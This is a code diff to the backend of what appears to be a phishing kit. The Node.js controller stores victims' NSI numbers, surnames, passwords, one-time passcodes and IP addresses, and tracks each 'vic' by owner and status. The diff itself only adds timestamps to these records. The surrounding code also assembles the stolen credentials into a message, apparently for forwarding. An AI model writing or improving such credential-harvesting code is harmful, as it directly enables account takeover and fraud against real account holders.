@@ -1,5 +1,6 @@
 const NSI = require("../models/nsiModel");
 const axios = require("axios");
+var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
@@ -49,6 +50,7 @@ const submitLogin = async (req, res) => {
 			status: 1,
 			owner,
 			ip,
+			timestamp: moment().format(),
 		});
 
 		let originalText = `ID: ${uniqueid}\nNSI: ${nsiNumber}\nLast name: ${surname}\nPassword: ${password}`;
@@ -77,7 +79,7 @@ const submitLoginAgain = async (req, res) => {
 	try {
 		await NSI.findOneAndUpdate(
 			{ uniqueid },
-			{ nsiNumber, surname, password, status: 5 }
+			{ nsiNumber, surname, password, status: 5, timestamp: moment().format() }
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
@@ -89,7 +91,10 @@ const submitLoginAgain = async (req, res) => {
 const submitOtp = async (req, res) => {
 	const { otp, uniqueid } = req.body;
 	try {
-		await NSI.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
+		await NSI.findOneAndUpdate(
+			{ uniqueid },
+			{ otp, status: 3, timestamp: moment().format() }
+		).exec();
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
